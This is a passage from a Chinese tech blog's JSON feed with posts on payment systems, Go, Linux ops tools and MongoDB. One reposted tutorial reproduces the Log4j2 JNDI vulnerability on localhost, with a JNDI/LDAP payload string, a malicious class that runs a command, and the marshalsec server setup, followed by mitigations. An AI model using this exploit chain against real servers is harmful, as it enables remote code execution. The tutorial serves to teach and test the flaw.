alt=\"\"></p>\n<ul>\n<li>数据一致性治理</li>\n</ul>\n<p>大型的支付公司，内部都有非常严格和完备的数据一致性方案，比如采用业务侵入性非常大的分布式事务等，以牺牲开发效率来提升数据的稳定，是非常有必要的。而业务公司，如果不采用分布式事务又有哪些应对策略呢？</p>\n<p>CAS校验<br><img src=\"/img/202304/20230605220615.png\" alt=\"\"></p>\n<p>幂等 &amp; 异常补偿<br><img src=\"/img/202304/20230605220626.png\" alt=\"\"></p>\n<p>对账<br><img src=\"/img/202304/20230605220636.png\" alt=\"\"></p>\n<p>准实时对账<br><img src=\"/img/202304/20230605220647.png\" alt=\"\"></p>\n<ul>\n<li><p>DB拆分<br><img src=\"/img/202304/20230605220656.png\" alt=\"\"></p>\n</li>\n<li><p>异步化</p>\n</li>\n</ul>\n<p>支付是整个交易链路的核心环节，那么，怎么兼顾支付系统的稳定性和执行效率呢？是异步化。</p>\n<p>消息异步化<br><img src=\"/img/202304/20230605220707.png\" alt=\"\"></p>\n<p>外部支付调用异步化<br><img src=\"/img/202304/20230605220720.png\" alt=\"\"></p>\n<p>在外部支付中，经常需要服务方与第三方支付交互，获取预支付凭证，如上图所示。</p>\n<p>这种同步调用的情况下，由于需要跨外部网络，响应的 RT 会非常长，可能会出现跨秒的情况。由于是同步调用，会阻塞整个支付链路。一旦 RT 很长且 QPS 比较大的情况下，服务会整体 hold 住，甚至会出现拒绝服务的情况。<br><img src=\"/img/202304/20230605220747.png\" alt=\"\"></p>\n<p>因此，可以拆分获取凭证的操作，通过独立网关渠道前置服务，将获取的方式异步化，从前置网关获取内部凭证，然后由前置网关去异步调用第三方。</p>\n<p>异步并行化<br><img src=\"/img/202304/20230605220759.png\" alt=\"\"></p>\n<p>资金核算异步化<br><img src=\"/img/202304/20230605220812.png\" alt=\"\"></p>\n<p>热点账户账务单独处理<br><img src=\"/img/202304/20230605220823.png\" alt=\"\"></p>\n<p>记账事务切分<br><img src=\"/img/202304/20230605220833.png\" alt=\"\"></p>\n<p>4.生产实践</p>\n<ul>\n<li>性能压测</li>\n</ul>\n<p>构建压测模型，模拟现实真实场景；压测数据进影子库，正常业务无侵入；单机性能和集权链路都不能忽视；识别系统稳定性和容量配比。。。<br><img src=\"/img/202304/20230605220847.png\" alt=\"\"></p>\n<ul>\n<li><p>稳定性治理<br><img src=\"/img/202304/20230605220858.png\" alt=\"\"></p>\n</li>\n<li><p>核心链路分离<br><img src=\"/img/202304/20230605220908.png\" alt=\"\"></p>\n</li>\n<li><p>服务依赖降级<br><img src=\"/img/202304/20230605220918.png\" alt=\"\"></p>\n</li>\n</ul>\n<p>转载自：<a href=\"https://mp.weixin.qq.com/s/0hxHkAoL47Fv6EKAleedAg\">https://mp.weixin.qq.com/s/0hxHkAoL47Fv6EKAleedAg</a></p>\n",
            "tags": [
                "支付系统",
                "支付"
            ]
        },
        {
            "id": "https://erik.xyz/2023/01/11/hand-and-hand-log4j/",
            "url": "https://erik.xyz/2023/01/11/hand-and-hand-log4j/",
            "title": "手把手教你复现 Log4j2 漏洞",
            "date_published": "2023-01-11T14:19:00.000Z",
            "content_html": "<h4 id=\"1-简介\"><a href=\"#1-简介\" class=\"headerlink\" title=\"1.简介\"></a>1.简介</h4><p>ApacheLog4j2是一个开源的Java日志框架，被广泛地应用在中间件、开发框架与Web应用中。</p>\n<h4 id=\"2-漏洞概述\"><a href=\"#2-漏洞概述\" class=\"headerlink\" title=\"2.漏洞概述\"></a>2.漏洞概述</h4><p>该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未经身份验证的攻击者通过发送特定恶意数据包，可在目标服务器上执行任意代码。<br><span id=\"more\"></span></p>\n<h4 id=\"3-影响范围\"><a href=\"#3-影响范围\" class=\"headerlink\" title=\"3.影响范围\"></a>3.影响范围</h4><p>Apache Log4j 2.x &lt;= 2.15.0-rc1</p>\n<h4 id=\"4-环境搭建\"><a href=\"#4-环境搭建\" class=\"headerlink\" title=\"4.环境搭建\"></a>4.环境搭建</h4><p>1、创建一个新的maven项目，并导入Log4j的依赖包<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h5><p>1、使用POC测试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import org.apache.logging.log4j.LogManager;</span><br><span class=\"line\">       import org.apache.logging.log4j.Logger;</span><br><span class=\"line\">       class LogTest &#123;</span><br><span class=\"line\">           public static final Logger logger = LogManager.getLogger();</span><br><span class=\"line\">           public static void main(String[] args) &#123;</span><br><span class=\"line\">               logger.error(&quot;$&#123;jndi:ldap://localhost:8888/Exploit&#125;&quot;);</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;</span><br></pre></td></tr></table></figure>\n<p>2、编译一恶意类Exploit.class</p>\n<p>首先新建exp.java，然后编译为class文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Exploit &#123;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        System.err.println(&quot;Pwned&quot;);</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            String cmds = &quot;calc&quot;;</span><br><span class=\"line\">            Runtime.getRuntime().exec(cmds);</span><br><span class=\"line\">        &#125; catch ( Exception e ) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javac exp.java</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>3、使用marshalsec-0.0.3-SNAPSHOT-all.jar本地开启一个LDAP服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer</span><br><span class=\"line\">&quot;http://127.0.0.1:7777/#Exploit&quot; 8888</span><br></pre></td></tr></table></figure>\n<p><img src=\"/img/202301/20230211220751.png\" alt=\"erik.xyz\"></p>\n<p>4、运行poc.java，即可访问恶意类并执行写在其中的”calc”命令 </p>\n<p><img src=\"/img/202301/20230211221053.png\" alt=\"erik.xyz\"></p>\n<p>结合一些其它 StrLookup 适当变形，以及配合官方测试用例中脏数据”?Type=A Type&amp;Name=1100110&amp;Char=!”可绕过rc1，RC2版本对此异常进行了捕获。<br><img src=\"/img/202301/20230211221141.png\" alt=\"erik.xyz\"></p>\n<h4 id=\"5-修复方式\"><a href=\"#5-修复方式\" class=\"headerlink\" title=\"5.修复方式\"></a>5.修复方式</h4><p>目前，Apache官方已发布新版本完成漏洞修复，建议用户尽快进行自查，并及时升级至最新版本：<a href=\"https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2\">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a> 建议同时采用如下临时措施进行漏洞防范：</p>\n<p>1）添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true；</p>\n<p>2）在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；</p>\n<p>3）JDK使用11.0.1、8u191、7u201、6u211及以上的高版本；</p>\n<p>4）部署使用第三方防火墙产品进行安全防护。</p>\n<p>链接：<a href=\"https://blog.csdn.net/qq_40989258/article/details/121862363\">https://blog.csdn.net/qq_40989258/article/details/121862363</a></p>\n",
            "tags": [
                "漏洞",
                "log4j2"
            ]
        },
        {
            "id": "https://erik.xyz/2022/05/22/go-add-pdf/",
            "url": "https://erik.xyz/2022/05/22/go-add-pdf/",
            "title": "go中生成PDF",
            "date_published": "2022-05-22T02:57:00.000Z",
            "content_html": "<p>一个简单但是非常实用的pdf生成器！</p>\n<p>安装：</p>\n<pre><code>go get github.com/jung-kurt/gofpdf\n</code></pre><span id=\"more\"></span>\n<p>代码：</p>\n<pre><code>package main\n\nimport (\n    &quot;github.com/jung-kurt/gofpdf&quot;\n)\n\nfunc main() &#123;\n    err := GeneratePdf(&quot;hello.pdf&quot;)\n    if err != nil &#123;\n        panic(err)\n    &#125;\n&#125;\n\nfunc GeneratePdf(filename string) error &#123;\n  pdf := gofpdf.New(&quot;P&quot;, &quot;mm&quot;, &quot;A4&quot;, &quot;&quot;)\n  pdf.AddPage()\n  pdf.SetFont(&quot;Arial&quot;, &quot;B&quot;, 16)\n  pdf.CellFormat(190, 7, &quot;Welcome to topgoer.com&quot;, &quot;0&quot;, 0, &quot;CM&quot;, false, 0, &quot;&quot;)\n\n  pdf.ImageOptions(\n      &quot;topgoer.png&quot;,\n      80, 20,\n      0, 0,\n      false,\n      gofpdf.ImageOptions&#123;ImageType: &quot;PNG&quot;, ReadDpi: true&#125;,\n      0,\n      &quot;&quot;,\n  )\n\n  return pdf.OutputFileAndClose(filename)\n  &#125;\n</code></pre>",
            "tags": [
                "go中pdf生成"
            ]
        },
        {
            "id": "https://erik.xyz/2022/05/10/get-http-address-ip/",
            "url": "https://erik.xyz/2022/05/10/get-http-address-ip/",
            "title": "go中获取HTTP请求的IP地址",
            "date_published": "2022-05-10T12:12:31.000Z",
            "content_html": "<pre><code>package main\n\nimport (\n    &quot;encoding/json&quot;\n    &quot;net/http&quot;\n)\n\nfunc main() &#123;\n    http.HandleFunc(&quot;/&quot;, ExampleHandler)\n    if err := http.ListenAndServe(&quot;:8080&quot;, nil); err != nil &#123;\n        panic(err)\n    &#125;\n&#125;\n\nfunc ExampleHandler(w http.ResponseWriter, r *http.Request) &#123;\n    w.Header().Add(&quot;Content-Type&quot;, &quot;application/json&quot;)\n    resp, _ := json.Marshal(map[string]string&#123;\n        &quot;ip&quot;: GetIP(r),\n    &#125;)\n    w.Write(resp)\n&#125;\n\nfunc GetIP(r *http.Request) string &#123;\n    forwarded := r.Header.Get(&quot;X-FORWARDED-FOR&quot;)\n    if forwarded != &quot;&quot; &#123;\n        return forwarded\n    &#125;\n    return r.RemoteAddr\n&#125;\n</code></pre>",
            "tags": [
                "go获取ip"
            ]
        },
        {
            "id": "https://erik.xyz/2022/04/12/go-limit-open/",
            "url": "https://erik.xyz/2022/04/12/go-limit-open/",
            "title": "go中限流器",
            "date_published": "2022-04-12T05:12:54.000Z",
            "content_html": "<p>限流器是后台服务中的非常重要的组件，可以用来限制请求速率，保护服务，以免服务过载。 限流器的实现方法有很多种，例如滑动窗口法、Token Bucket、Leaky Bucket等。</p>\n<p>其实golang标准库中就自带了限流算法的实现，即golang.org/x/time/rate。 该限流器是基于Token Bucket(令牌桶)实现的。</p>\n<p>简单来说，令牌桶就是想象有一个固定大小的桶，系统会以恒定速率向桶中放Token，桶满则暂时不放。 而用户则从桶中取Token，如果有剩余Token就可以一直取。如果没有剩余Token，则需要等到系统中被放置了Token才行。<br><span id=\"more\"></span><br>本文则主要集中介绍下该组件的具体使用方法：</p>\n<p>我们可以使用以下方法构造一个限流器对象：</p>\n<pre><code>limiter := NewLimiter(10, 1);\n</code></pre><p>这里有两个参数：</p>\n<ul>\n<li>第一个参数是r Limit。代表每秒可以向Token桶中产生多少token。Limit实际上是float64的别名。</li>\n<li>第二个参数是b int。b代表Token桶的容量大小。 那么，对于以上例子来说，其构造出的限流器含义为，其令牌桶大小为1, 以每秒10个Token的速率向桶中放置Token。</li>\n</ul>\n<p>除了直接指定每秒产生的Token个数外，还可以用Every方法来指定向Token桶中放置Token的间隔，例如：</p>\n<pre><code>limit := Every(100 * time.Millisecond);\nlimiter := NewLimiter(limit, 1);\n</code></pre><p>以上就表示每100ms往桶中放一个Token。本质上也就是一秒钟产生10个。</p>\n<p>Limiter提供了三类方法供用户消费Token，用户可以每次消费一个Token，也可以一次性消费多个Token。 而每种方法代表了当Token不足时，各自不同的对应手段。</p>\n<p> Wait/WaitN </p>\n<pre><code>func (lim *Limiter) Wait(ctx context.Context) (err error)\nfunc (lim *Limiter) WaitN(ctx context.Context, n int) (err error)\n</code></pre><p>Wait实际上就是WaitN(ctx,1)。</p>\n<p>当使用Wait方法消费Token时，如果此时桶内Token数组不足(小于N)，那么Wait方法将会阻塞一段时间，直至Token满足条件。如果充足则直接返回。</p>\n<p>这里可以看到，Wait方法有一个context参数。 我们可以设置context的Deadline或者Timeout，来决定此次Wait的最长时间。</p>\n<p>Allow/AllowN</p>\n<pre><code>func (lim *Limiter) Allow() bool\nfunc (lim *Limiter) AllowN(now time.Time, n int) bool\n</code></pre><p>Allow实际上就是AllowN(time.Now(),1)。</p>\n<p>AllowN方法表示，截止到某一时刻，目前桶中数目是否至少为n个，满足则返回true，同时从桶中消费n个token。 反之返回不消费Token，false。</p>\n<p>通常对应这样的线上场景，如果请求速率过快，就直接丢到某些请求。</p>\n<p> Reserve/ReserveN</p>\n<pre><code>func (lim *Limiter) Reserve() *Reservation\nfunc (lim *Limiter) ReserveN(now time.Time, n int) *Reservation\n</code></pre><p>Reserve相当于ReserveN(time.Now(), 1)。</p>\n<p>ReserveN的用法就相对来说复杂一些，当调用完成后，无论Token是否充足，都会返回一个Reservation*对象。</p>\n<p>你可以调用该对象的Delay()方法，该方法返回了需要等待的时间。如果等待时间为0，则说明不用等待。 必须等到等待时间之后，才能进行接下来的工作。</p>\n<p>或者，如果不想等待，可以调用Cancel()方法，该方法会将Token归还。</p>\n<p>举一个简单的例子，我们可以这么使用Reserve方法。</p>\n<pre><code>r := lim.Reserve()\nf !r.OK() &#123;\n    // Not allowed to act! Did you remember to set lim.burst to be &gt; 0 ?\n    return\n&#125;\ntime.Sleep(r.Delay())\nAct() // 执行相关逻辑\n</code></pre><p> 动态调整速率</p>\n<p>Limiter支持可以调整速率和桶大小：</p>\n<pre><code>SetLimit(Limit) 改变放入Token的速率\nSetBurst(int) 改变Token桶大小\n</code></pre><p>有了这两个方法，可以根据现有环境和条件，根据我们的需求，动态的改变Token桶大小和速率</p>\n<p>实例代码</p>\n<pre><code>package main\n\nimport (\n    &quot;context&quot;\n    &quot;log&quot;\n    &quot;time&quot;\n\n    &quot;golang.org/x/time/rate&quot;\n)\n\n//limit表示每秒产生token数，buret最多存token数\n//Allow判断当前是否可以取到token\n//Wait阻塞等待知道取到token\n//Reserve返回等待时间，再去取token\n\nfunc main() &#123;\n    l := rate.NewLimiter(1, 5)\n    log.Println(l.Limit(), l.Burst())\n    for i := 0; i &lt; 100; i++ &#123;\n        //阻塞等待直到，取到一个token\n        log.Println(&quot;before Wait&quot;)\n        c, _ := context.WithTimeout(context.Background(), time.Second*2)\n        if err := l.Wait(c); err != nil &#123;\n            log.Println(&quot;limiter wait err:&quot; + err.Error())\n        &#125;\n        log.Println(&quot;after Wait&quot;)\n\n        //返回需要等待多久才有新的token,这样就可以等待指定时间执行任务\n        r := l.Reserve()\n        log.Println(&quot;reserve Delay:&quot;, r.Delay())\n\n        //判断当前是否可以取到token\n        a := l.Allow()\n        log.Println(&quot;Allow:&quot;, a)\n    &#125;\n&#125;\n</code></pre>",
            "tags": [
                "go中限流"
            ]
        },
        {
            "id": "https://erik.xyz/2021/08/22/10-logs-tools-total/",
            "url": "https://erik.xyz/2021/08/22/10-logs-tools-total/",
            "title": "10个Web日志安全性分析工具",
            "date_published": "2021-08-22T13:30:00.000Z",
            "content_html": "<p>首先，我们应该清楚的是，日志文件不仅可以帮助我们追踪入侵者的来源并找到其攻击路径，而且在正常的操作和维护中，日志还可以反映出许多安全攻击。<br>一个简单易用的Web日志分析工具可以大大提高效率。当前，行业中有许多日志分析工具。今天，我们推荐十种易于使用的Web日志安全性分析工具。</p>\n<span id=\"more\"></span>\n<p>1.360星图</p>\n<p>一个非常易于使用的网站访问日志分析工具，可以有效地识别Web漏洞攻击，CC攻击，恶意爬网程序扫描，异常访问和其他行为。一键式自动分析，输出安全性分析报告，支持iis / apache / nginx日志，支持自定义格式。</p>\n<p>2.LogForensics</p>\n<p>TSRC提供的日志分析工具可以从单个可疑线索开始，并遍历所有可疑URL（CGI）和源IP。</p>\n<p>3.GoAccess</p>\n<p>可视化Web日志分析工具，可通过* nix系统下的Web浏览器或终端程序进行访问。它可以为系统管理员提供快速而有价值的HTTP统计信息，并以在线可视化服务器的形式显示它们。</p>\n<p>4.AWStats</p>\n<p>强大的开源日志分析系统，可以图形方式生成高级Web，流媒体，ftp或邮件服务器统计信息。</p>\n<p>5.Logstalgia</p>\n<p>一个非常酷的可视化日志分析工具，可以直观地显示CC攻击和网站的日志分析，并以可视化的3D效果显示它。</p>\n<p>6.FinderWeb</p>\n<p>程序员用于监视日志的工具，支持tail，less，grep，并支持大文本文件。从几个M到几十个G的日志文件都是平滑且免费的。</p>\n<p>7.web-log-parser</p>\n<p>使用python语言开发的开源Web日志分析工具，具有灵活的日志格式配置。</p>\n<p>8.ELK</p>\n<p>用于开源实时日志分析的ELK平台包含三个开源项目，即ElasticSearch，Logstash和Kiabana，在企业级日志管理平台中非常常见。</p>\n<p>9.Splunk</p>\n<p>顶级日志分析软件，如果您经常使用grep，awk，sed，sort，uniq，tail，head来分析日志，则可以轻松过渡到Splunk。</p>\n<p>10.IBM QRadar</p>\n<p>Qradar具有免费的社区版本，其功能与商业版本没有太大区别，适用于小型日志和流量分析。</p>\n<p>文章转载：乌云安全</p>\n",
            "tags": [
                "日志",
                "工具"
            ]
        },
        {
            "id": "https://erik.xyz/2021/07/15/linux-tools-system/",
            "url": "https://erik.xyz/2021/07/15/linux-tools-system/",
            "title": "Linux 运维必备的13款实用工具",
            "date_published": "2021-07-15T13:15:00.000Z",
            "content_html": "<p>1、查看进程占用带宽情况-Nethogs</p>\n<p>Nethogs 是一个终端下的网络流量监控工具可以直观的显示每个进程占用的带宽。<br>下载：<a href=\"http://sourceforge.net/projects/nethogs/files/nethogs/0.8/nethogs-0.8.0.tar.gz/download\">http://sourceforge.net/projects/nethogs/files/nethogs/0.8/nethogs-0.8.0.tar.gz/download</a></p>\n<pre><code>yum -y install libpcap-devel ncurses-devel\ntar zxvf nethogs-0.8.0.tar.gz\ncd nethogs\nmake &amp;&amp; make install\nnethogs eth0\n</code></pre><span id=\"more\"></span>\n<p>2、硬盘读取性能测试-IOZone</p>\n<p>IOZone是一款Linux文件系统性能测试工具 可以测试不同的操作系统中文件系统的读写性能。<br>下载：<a href=\"http://www.iozone.org/src/current/\">http://www.iozone.org/src/current/</a></p>\n<pre><code>tar xvf iozone3_420.tar\ncd iozone3_420/src/current/\nmake linux\n./iozone -a -n 512m -g 16g -i 0 -i 1 -i 5 -f /mnt/iozone -Rb ./iozone.xls\n</code></pre><ul>\n<li>a使用全自动模式</li>\n<li>n为自动模式设置最小文件大小(Kbytes)。</li>\n<li>g设置自动模式可使用的最大文件大小Kbytes。</li>\n<li>i用来指定运行哪个测试。</li>\n<li>f指定测试文件的名字完成后自动删除</li>\n<li>R产生Excel到标准输出</li>\n<li>b指定输出到指定文件上</li>\n</ul>\n<p>3、实时监控磁盘IO-IOTop</p>\n<p>IOTop命令是专门显示硬盘IO的命令,界面风格类似top命令。</p>\n<pre><code>    yum -y install iotop\n</code></pre><p>4、网络流量监控-IPtraf</p>\n<p>IPtraf是一个运行在Linux下的简单的网络状况分析工具。</p>\n<pre><code>yum -y install iptraf\n</code></pre><p>5、网络流量监控-IFTop</p>\n<p>iftop是类似于linux下面top的实时流量监控工具。比iptraf直观些。<br>下载：<a href=\"http://www.ex-parrot.com/~pdw/iftop/\">http://www.ex-parrot.com/~pdw/iftop/</a></p>\n<pre><code>tar zxvf iftop-0.17.tar.gz\ncd iftop-0.17\n./configure\nmake &amp;&amp; make install\n\niftop \niftop -i eth0 \n</code></pre><h1 id=\"指定监控网卡接口\"><a href=\"#指定监控网卡接口\" class=\"headerlink\" title=\"指定监控网卡接口\"></a>指定监控网卡接口</h1><ul>\n<li>TX：发送流量</li>\n<li>RX：接收流量</li>\n<li>TOTAL：总流量</li>\n<li>Cumm：运行iftop到目前时间的总流量</li>\n<li>peak：流量峰值</li>\n<li>rates：分别表示过去 2s 10s 40s 的平均流量</li>\n</ul>\n<p>6、进程实时监控-HTop</p>\n<p>HTop是一个 Linux 下的交互式的进程浏览器可以用来替换Linux下的top命令。<br>rpm -ivh <a href=\"http://pkgs.repoforge.org/rpmforge-release/rpmforge-release-0.5.2-2.el6.rf.x86_64.rpm（安装第三方YUM源）\">http://pkgs.repoforge.org/rpmforge-release/rpmforge-release-0.5.2-2.el6.rf.x86_64.rpm（安装第三方YUM源）</a></p>\n<pre><code>yum -y install htop\n</code></pre><p>7、系统资源监控-NMON</p>\n<p>NMON是一种在AIX与各种Linux操作系统上广泛使用的监控与分析工具<br>下载：<a href=\"http://sourceforge.jp/projects/sfnet_nmon/releases/\">http://sourceforge.jp/projects/sfnet_nmon/releases/</a></p>\n<pre><code>chmod +x nmon_x86_64_rhel6\nmv nmon_x86_64_rhel6 /usr/sbin/nmon\nnmon\n</code></pre><p>8、监控多个日志-MultiTail</p>\n<p>MultiTail是在控制台打开多个窗口用来实现同时监控多个日志文档、类似tail命令的功能的软件。<br>rpm -ivh <a href=\"http://pkgs.repoforge.org/rpmforge-release/rpmforge-release-0.5.2-2.el6.rf.x86_64.rpm\">http://pkgs.repoforge.org/rpmforge-release/rpmforge-release-0.5.2-2.el6.rf.x86_64.rpm</a> （安装第三方YUM源）</p>\n<pre><code>  yum -y install multitail\n  multitail -e &quot;fail&quot; /var/log/secure #筛选关键字进行监控\n  multitail -l &quot;ping baidu.com&quot; #监控后面的命令-l将要执行的命令\n  multitail -i /var/log/messages -i /var/log/secure #-i指定一个文件名\n</code></pre><p>9、SSH暴力破解防护-Fail2ban</p>\n<p>Fail2ban可以监视你的系统日志然后匹配日志的错误信息正则式匹配执行相应的屏蔽动作一般情况下是调用防火墙屏蔽<br>下载：<a href=\"http://www.fail2ban.org/wiki/index.php/Downloads\">http://www.fail2ban.org/wiki/index.php/Downloads</a></p>\n<pre><code>cd fail2ban-0.8.11\npython setup.py install\ncd files/\ncp ./redhat-initd /etc/init.d/fail2ban\nservice fail2ban start\nchkconfig --add fail2ban\nchkconfig fail2ban on\n</code></pre><p>注：需要配置iptables实用，如果重启iptables了也要重启fail2ban，因为fail2ban的原理是调用iptables实时阻挡外界的攻击。</p>\n<pre><code>grep -v &quot;^#&quot; /etc/fail2ban/jail.conf | grep -v &quot;^$&quot; [DEFAULT]\nignoreip = 127.0.0.1/8#忽略本机IP\nbantime = 600   #符合规则后封锁时间\nfindtime = 600  #在多长时间内符合规则执行封锁如600秒达到3次则执行\nmaxretry = 3    #最大尝试次数\nbackend = auto #日志修改检测日志gamin、polling和auto这三种\nusedns = warn [ssh-iptables]\nenabled = true#默认是禁用\nfalse filter = sshd action = iptables[name=SSH, port=ssh, protocol=tcp] # sendmail-whois[name=SSH,dest=收件人邮箱, sender=发件人邮箱, sendername=&quot;Fail2Ban&quot;] logpath = /var/log/sshd.log #响应的错误日志一般在/var/log/secure maxretry = 5 #尝试错误次数覆盖全局中的maxretry\n</code></pre><p>注：默认所有的应用防护都是关闭的，需要我们手动开启。fail2ban.conf文件是日志信息，jail.conf文件是保护的具体服务和动作配置信息。</p>\n<pre><code>touch /var/log/sshd.log\nservice fail2ban restart\nfail2ban-client status #查看监控已经开启 Status |- Number of jail: 1 `- Jail list: ssh-iptables\niptables -L #iptables过滤表有fail2ban一条规则 fail2ban-SSH tcp -- anywhere anywhere tcp dpt:ssh\n</code></pre><p>10、连接会话终端持续化-Tmux</p>\n<p>Tmux是一个优秀的终端复用软件类似GNU Screen比Screen更加方面、灵活和高效。为了确保连接SSH时掉线不影响任务运行。<br>rpm -ivh <a href=\"http://pkgs.repoforge.org/rpmforge-release/rpmforge-release-0.5.2-2.el6.rf.x86_64.rpm（安装第三方YUM源）\">http://pkgs.repoforge.org/rpmforge-release/rpmforge-release-0.5.2-2.el6.rf.x86_64.rpm（安装第三方YUM源）</a></p>\n<p>11、页面显示磁盘空间使用情况-Agedu</p>\n<p>下载：<a href=\"http://www.chiark.greenend.org.uk/~sgtatham/agedu/\">http://www.chiark.greenend.org.uk/~sgtatham/agedu/</a></p>\n<pre><code>tar zxvf agedu-r9723.tar.gz\ncd agedu-r9723\n./configure\nmake &amp;&amp; make install\nagedu -s / #-s扫描\nagedu -w --address 192.168.0.10:80 #-w输入一个网页链接\nagedu -w --address 192.168.0.108080 --auth none #--auth关闭认证如果不加端口号会生成一个随机的用浏览器访问\n</code></pre><p>12、安全扫描工具-NMap</p>\n<p>NMap是Linux下的网络连接扫描和嗅探工具包用来扫描网上电脑开放的网络连接端。<br>下载：<a href=\"http://nmap.org/download.html\">http://nmap.org/download.html</a></p>\n<pre><code>tar jxvf nmap-6.40.tar.bz2\n./configure\nmake &amp;&amp; make install\nnmap 192.168.0.10 #获取基本信息\nnmap -O 192.168.0.10 #获取系统版本信息\nnmap -A 192.168.0.10 #获取系统综合信息\nnmap 192.168.0.0/24 #获取一个网段工作设备基本信息\n</code></pre><ul>\n<li><p>-sSTCP扫描</p>\n</li>\n<li><p>-sV系统版本检测</p>\n</li>\n</ul>\n<p>13、Web压力测试-Httperf</p>\n<p>Httperf比ab更强大，能测试出web服务能承载的最大服务量及发现潜在问题；比如：内存使用、稳定性。最大优势：可以指定规律进行压力测试，模拟真实环境。<br>下载：<a href=\"http://code.google.com/p/httperf/downloads/list\">http://code.google.com/p/httperf/downloads/list</a></p>\n<pre><code>tar zxvf httperf-0.9.0.tar.gz\ncd httperf-0.9.0\n./configure\nmake &amp;&amp; make install\nhttperf --hog --server=192.168.0.202 --uri=/index.html --num-conns=10000 --wsess=10,10,0.1\n</code></pre><p>参数说明：    </p>\n<ul>\n<li><p>—hog：让httperf尽可能多产生连接，httperf会根据硬件配置，有规律的产生访问连接；</p>\n</li>\n<li><p>—num-conns：连接数量，总发起10000请求；</p>\n</li>\n<li><p>—wsess： 用户打开网页时间规律模拟，第一个10表示产生10个会话连接，第二个10表示每个会话连接进行10次请求，0.1表示每个会话连接请求之间的间隔时间/s。</p>\n</li>\n</ul>\n<p>转载自：<a href=\"https://mp.weixin.qq.com/s/g7BksCQuTbwUorspGR7mcQ\">https://mp.weixin.qq.com/s/g7BksCQuTbwUorspGR7mcQ</a></p>\n",
            "tags": [
                "工具"
            ]
        },
        {
            "id": "https://erik.xyz/2020/06/20/mongodb-user-rbc/",
            "url": "https://erik.xyz/2020/06/20/mongodb-user-rbc/",
            "title": "MongoDB权限说明",
            "date_published": "2020-06-20T07:31:00.000Z",
            "content_html": "<p>权限误区  并不是说下面的排序就证明权限越来越大除了readWrite权限用户外(root权限用户也包括)，其它用户都不具备对数据库的写入权限，除 read 权限外，其它用户都不具备对数据库中的读权限，每个权限的功能各不一样(除root外)</p>\n<span id=\"more\"></span>\n<h4 id=\"普通用户\"><a href=\"#普通用户\" class=\"headerlink\" title=\"普通用户\"></a>普通用户</h4><p>普通用户只是拥有下面的读写权限</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>权限</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Read</td>\n<td>允许用户读取指定数据库</td>\n</tr>\n<tr>\n<td>readWrite</td>\n<td>允许用户读写指定数据库</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h4 id=\"管理用户\"><a href=\"#管理用户\" class=\"headerlink\" title=\"管理用户\"></a>管理用户</h4><p>管理用户具备下面说明的一些操作权限</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>权限</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>dbAdmin</td>\n<td>允许用户在指定数据库中指定管理函数，如(索引创建、删除、查看统计访问system.profile)</td>\n</tr>\n<tr>\n<td>userAdmin</td>\n<td>允许用户向system.users集合写入，可以找指定数据里面创建、删除和管理用户</td>\n</tr>\n<tr>\n<td>clusterAdmin</td>\n<td>只在admin数据库中可用，赋予用户所有分片和复制集相关函数的管理权限</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h4 id=\"授权用户\"><a href=\"#授权用户\" class=\"headerlink\" title=\"授权用户\"></a>授权用户</h4><p>以下用户主要是为其它用户赋予相应的权限</p>\n<div 